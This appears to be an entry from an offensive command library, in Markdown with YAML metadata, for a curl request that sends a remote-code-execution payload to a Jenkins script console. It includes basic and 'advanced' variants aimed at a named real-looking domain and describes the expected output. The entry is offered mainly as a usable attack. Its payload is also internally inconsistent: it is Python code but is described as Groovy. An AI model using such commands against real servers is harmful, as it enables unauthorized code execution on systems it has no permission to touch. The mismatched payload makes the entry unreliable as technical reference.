---
id: c1b2c3d4-e5f6-7890-abcd-ef1234567892
data: >-
  curl -X POST 'https://TARGET/scriptText' --data 'import subprocess;
  subprocess.call("id", shell=True)'
name: curl-jenkins-rce-payload
tags:
  - rce
  - jenkins
  - exploit
type: command
output: HTTP response with potential command output or 200 OK indicating execution
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.880Z'
verified: false
validated: true
submitted: true
---
# curl-jenkins-rce-payload

## Command

```bash
curl -X POST 'https://TARGET/scriptText' --data 'import subprocess; subprocess.call("id", shell=True)'
```

## Description

This command sends a POST request to a Jenkins script console endpoint to inject and execute an OS command via Groovy scripting, exploiting unauthenticated command injection vulnerabilities. Replace TARGET with the Jenkins URL (e.g., djangoci.com). It's used to test or achieve RCE in vulnerable Jenkins instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://TARGET/scriptText'` | Jenkins endpoint URL for script execution | Yes |
| `--data '...'` | Payload containing Groovy code to run shell command | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://djangoci.com/scriptText' --data 'import subprocess; subprocess.call("id", shell=True)'
```

### Advanced Usage

```bash
curl -X POST 'https://djangoci.com/scriptText' --data 'import subprocess; subprocess.call("whoami > /tmp/pwned.txt", shell=True)'
```

## Expected Output

A successful response might be HTTP 200 OK with the command's output embedded (e.g., 'uid=1000(jenkins)...') or no error, with effects visible server-side. Failures return 403/500 or auth errors if patched.

## Related

- [[Related Procedure|procedures/Exploit-Jenkins-Unauthenticated-RCE]]
